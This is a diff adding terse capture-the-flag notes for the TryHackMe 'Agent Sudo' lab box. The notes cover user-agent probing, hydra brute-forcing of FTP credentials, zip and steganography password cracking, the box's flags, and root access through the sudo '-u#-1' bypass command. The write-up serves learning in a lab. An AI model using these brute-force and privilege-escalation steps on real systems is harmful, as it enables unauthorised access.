@@ -1,0 +1,83 @@
+port 80 webpage
+================
+Dear agents,
+
+Use your own codename as user-agent to access the site.
+
+From,
+Agent R 
+
+found something good...
+======================
+-method tried: bruteForce each char (UpperCase)
+-C respond
+/*
+HTTP/1.1 302 Found
+Date: Wed, 22 Apr 2020 03:20:50 GMT
+Server: Apache/2.4.29 (Ubuntu)
+Location: agent_C_attention.php
+*/
+
+-C = chris
+
+agent_C_attention.php
+=====================
+seems like agent chris have weak password uh(rockyou.txt)? 
+
+hydra BruteForce(creds)
+=======================
+ftp: chris:crystal
+
+from ftp files
+==============
+-cutie.png using binwalk extracted zipfile
+ -8702.zip pw: alien (used zip2john extract hash)
+  -9702.zip: To_agentR.txt msg (send the picture to 'QXJlYTUx')
+-cute-alien.jpg(stegohide to extract info)
+
+//grep -x '.\{6\}': to grep 6 char long length
+
+stego pw(crack with stegocracker)
+=================================
+Your file has been written to: /home/nobodyatall/tryhackme/agentSudo/ftpFile/cute-alien.jpg.out
+pw: Area51
+
+//contentOfFile: james:hackerrules!
+
+userFlag
+========
+james@agent-sudo:~$ cat user_flag.txt 
+b03d975e8c92a7c04146cfa7a5a313c7
+
+The Alien_autopsy.jpg image info(OSINT)
+=======================================
+-incident: Roswell alien autopsy
+
+found a CVE to abuse sudo version 1.8.21p2
+------------------------------------------
+link
+=====
+https://www.cybersecurity-help.cz/vdb/SB2019101501
+https://www.cybersecurity-help.cz/vdb/sudo/sudo/1.8.21p2/
+
+The following entry instructs sudo to allow user bob to run "/usr/bin/id" command as any user on the system but root:
+=>myhost bob = (ALL, !root) /usr/bin/id
+
+The following command will allow bob execute the  "/usr/bin/id" command as root:
+=>sudo -u#-1 id -u
+
+so, sudo -u#-1 /bin/bash (become root user)
+
+RootFlag
+--------
+root@agent-sudo:/root# cat root.txt 
+To Mr.hacker,
+
+Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 
+
+Your flag is 
+b53a02f55b57d4439e3341834d70c062
+
+By,
+DesKel a.k.a Agent R
+
